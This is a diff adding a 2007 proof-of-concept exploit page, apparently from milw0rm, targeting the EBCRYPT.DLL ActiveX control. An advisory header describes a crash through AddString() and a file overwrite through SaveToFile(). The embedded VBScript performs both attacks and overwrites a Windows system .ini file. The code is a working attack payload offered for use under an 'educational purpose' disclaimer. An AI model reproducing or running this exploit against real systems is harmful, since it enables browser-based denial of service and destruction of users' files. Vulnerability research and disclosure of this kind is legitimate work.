@@ -1,0 +1,55 @@
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol"><body bgcolor="#E0E0E0">-----------------------------------------------------------------------------
+ <b>EB Design Pty Ltd (EBCRYPT.DLL v.2.0) Multiple Remote Vulnerabilites</b>
+ url: http://www.ebcrypt.com/
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ <b><font color='red'>This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.</font></b>
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+
+ <b>Marked as:
+ RegKey Safe for Script: False
+ RegKey Safe for Init: False
+ Implements IObjectSafety: True
+ IDisp Safe: Safe for untrusted: caller, data
+ KillBitSet: False</b>
+
+ This control contains two vulnerabilities:
+ 1) It is possible to cause a DoS passing at least one character to
+    "AddString()" method. This is a dump of exception:
+
+    Access violation when reading [3A433B2E]
+    03158CA4   FF51 10 => CALL DWORD PTR DS:[ECX+10] <-- crash
+    ECX 3A433B2E <-- ".;C:" (is a part of path)
+
+ 2) It is possible to overwrite a file passed as argument to "SaveToFile()"
+    method
+-----------------------------------------------------------------------------
+
+
+<object classid='clsid:3C34EAC7-9904-4415-BBE4-82AA8C0C0BE8' id='test1'></object>
+<object classid='clsid:B1E7505E-BBFD-42BF-98C9-602205A1504C' id='test2'></object>
+
+<input language=VBScript onclick=tryAddString() type=button value='Click here to start AddString test    '>
+
+<input language=VBScript onclick=trySaveToFile() type=button value='Click here to start SaveToFile test'>
+
+<script language='vbscript'>
+  Sub tryAddString
+   test1.AddString "A"
+  End Sub
+
+  Sub trySaveToFile
+   test2.SaveToFile "C:\WINDOWS\system_.ini"
+   MsgBox "Exploit completed."
+  End Sub
+</script>
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-09-24]
